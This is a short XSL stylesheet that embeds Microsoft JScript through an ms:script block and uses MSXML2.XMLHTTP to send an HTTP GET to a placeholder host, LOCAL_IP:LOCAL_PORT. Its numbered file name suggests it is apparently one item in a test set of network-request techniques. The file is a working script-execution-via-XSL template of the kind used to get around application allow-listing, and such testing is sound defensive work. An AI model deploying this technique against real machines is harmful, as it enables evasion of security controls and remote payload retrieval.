<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<output method="text"/>
 <ms:script implements-prefix="user" language="JScript">
	 <![CDATA[
		var url = "http://LOCAL_IP:LOCAL_PORT/HTTP_26_xmlhttp.xsl"
		var Object = WScript.CreateObject('MSXML2.XMLHTTP');
		Object.Open('GET', url, false);
		Object.Send();
	 ]]>
 </ms:script>
</stylesheet>